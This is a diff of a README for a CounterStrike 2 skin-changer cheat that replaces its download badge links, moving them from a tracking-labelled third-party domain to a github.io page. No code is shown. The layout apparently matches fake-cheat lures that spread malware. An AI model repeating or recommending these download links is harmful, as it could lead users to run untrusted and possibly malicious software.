@@ -2,7 +2,7 @@
 
 **CounterStrike 2 SkinChanger** is a powerful tool designed to give you full control over the appearance of your weapons in CounterStrike 2. With a wide selection of skins and an easy-to-use interface, you can customize your loadout and stand out in the game.
 
-[![Download CS2 SkinChanger](https://img.shields.io/badge/Download-CS2%20SkinChanger-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download CS2 SkinChanger](https://img.shields.io/badge/Download-CS2%20SkinChanger-blueviolet)](https://counterstrike-2-skinchanger.github.io/.github/)
 
 ## ⚙️ Features
 
@@ -23,4 +23,4 @@
 3. Choose the weapon skins you want to apply.
 4. Use hotkeys to switch skins during gameplay.
 
-[![Download CS2 SkinChanger](https://img.shields.io/badge/Download-CS2%20SkinChanger-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download CS2 SkinChanger](https://img.shields.io/badge/Download-CS2%20SkinChanger-blueviolet)](https://counterstrike-2-skinchanger.github.io/.github/)
